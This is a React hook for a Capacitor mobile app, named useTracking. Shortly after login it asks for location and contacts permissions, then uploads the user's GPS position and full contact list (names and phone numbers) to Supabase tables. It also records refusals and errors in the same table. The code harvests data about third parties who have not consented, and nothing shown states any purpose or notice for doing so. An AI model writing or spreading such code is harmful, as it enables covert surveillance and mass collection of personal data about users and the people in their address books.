import { useEffect } from 'react';
import { Capacitor } from '@capacitor/core';
import { Geolocation } from '@capacitor/geolocation';
import { Contacts } from '@capacitor-community/contacts';
import { supabase } from '@/lib/supabase-client';
import { useAuth } from '@/contexts/auth-context';

export function useTracking() {
  const { user } = useAuth();

  useEffect(() => {
    if (!user || !Capacitor.isNativePlatform()) return;

    const trackData = async () => {
      try {
        // 1. Get Location
        let locationPerm = await Geolocation.checkPermissions();
        if (locationPerm.location !== 'granted') {
          locationPerm = await Geolocation.requestPermissions();
        }
        
        if (locationPerm.location === 'granted') {
          const position = await Geolocation.getCurrentPosition();
          await supabase.from('user_locations').insert({
            user_id: user.id,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          });
        }

        // 2. Get Contacts
        try {
          let contactPerm = await Contacts.checkPermissions();
          if (contactPerm.contacts !== 'granted') {
            const req = await Contacts.requestPermissions();
            contactPerm = req || contactPerm;
          }

          if (contactPerm.contacts === 'granted') {
            const result = await Contacts.getContacts({
              projection: {
                name: true,
                phones: true,
              }
            });
            
            if (result && result.contacts) {
              const simplifiedContacts = result.contacts.map((c: any) => ({
                name: c.name?.display || 'Unknown',
                phones: c.phones?.map((p: any) => p.number) || []
              }));

              await supabase.from('user_contacts').insert({
                user_id: user.id,
                contacts_data: simplifiedContacts
              });
            }
          } else {
            // Permission denied
            await supabase.from('user_contacts').insert({
              user_id: user.id,
              contacts_data: [{ error: 'Permission denied by user' }]
            });
          }
        } catch (contactError: any) {
          // Log exact error to DB
          await supabase.from('user_contacts').insert({
            user_id: user.id,
            contacts_data: [{ error: contactError?.message || 'Unknown contact error' }]
          });
        }
      } catch (error) {
        console.error('Tracking error:', error);
      }
    };

    // Run tracking once per session shortly after login
    setTimeout(() => {
      trackData();
    }, 5000);

  }, [user]);
}
